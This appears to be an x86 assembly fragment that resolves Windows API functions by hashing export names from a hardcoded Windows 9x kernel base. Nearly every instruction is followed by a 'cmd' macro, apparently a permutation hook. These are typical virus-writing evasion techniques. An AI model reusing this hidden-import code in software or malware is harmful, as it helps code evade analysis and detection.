   ; all import-related stuff is here

   calchash                macro   procname
                           hash = 0
                           irpc    c, <procname>
                           hash = ((hash shl 7) and 0FFFFFFFFh) or (hash shr (32-7))
                           hash = hash xor "&c"
                           endm
                           endm

   mov_h                   macro   reg, procname
                           calchash procname
   cmd
                           mov     reg, hash
   cmd
                           endm

   import                  macro   x      ; process one import (x=procname)
                           IF      _q EQ 1
   cmd
                           mov_h   eax, x  ; calc hash
   cmd
                           call    edx
   cmd
                           stosd
   cmd
                           ELSE
   xx&x                    dd      ?
                           ENDIF
                           endm

   import_main             macro   q
                           _q      = q
   include                 implist.inc
                           endm

   init_win32api:
   cmd
                           pusha
   cmd
                           call    get_kernel_export_base
   cmd
                           lea     edx, findfunc_caller
   cmd
                           lea     edi, xx_first
   cmd
                           cld
   cmd
                           import_main 1
   cmd
                           popa
   cmd
                           ret
   cmd
   get_kernel_export_base: mov     ebx, 0BFF70000h
   cmd
                           mov     ecx, [ebx].mz_neptr
   cmd
                           mov     ecx, [ecx+ebx].pe_exporttablerva
   cmd
                           add     ecx, ebx
   cmd
                           ret
   cmd

   findfunc_caller:        push    edi
   cmd
                           push    edx
   cmd
                           xchg    edi, eax
   cmd
                           call    findfunc
   cmd
                           pop     edx
   cmd
                           pop     edi
   cmd
                           jnz     __ret
   cmd
                           pop     eax
   cmd
   __ret:                  ret
   cmd

   findfunc:               xor     esi, esi
   cmd
   __search_cycle:         lea     edx, [esi*4+ebx]
   cmd
                           add     edx, [ecx].ex_namepointersrva
   cmd
                           mov     edx, [edx]
   cmd
                           add     edx, ebx
   cmd
                           xor     eax, eax
   cmd
   __calc_hash:            rol     eax, 7
   cmd
                           xor     al, [edx]
   cmd
                           inc     edx
   cmd
                           cmp     byte ptr [edx], 0
   cmd
                           jne     __calc_hash
   cmd
                           cmp     eax, edi
   cmd
                           je      __name_found
   cmd
                           inc     esi
   cmd
                           cmp     esi, [ecx].ex_numofnamepointers
   cmd
                           jb      __search_cycle
   cmd
                           xor     eax, eax
   cmd
                           ret
   cmd
   __name_found:           mov     edx, [ecx].ex_ordinaltablerva
   cmd
                           add     edx, ebx
   cmd
                           movzx   edx, word ptr [edx+esi*2]
   cmd
                           mov     eax, [ecx].ex_addresstablerva
   cmd
                           add     eax, ebx
   cmd
                           mov     eax, [eax+edx*4]
   cmd
                           add     eax, ebx
   cmd
                           ret
   cmd
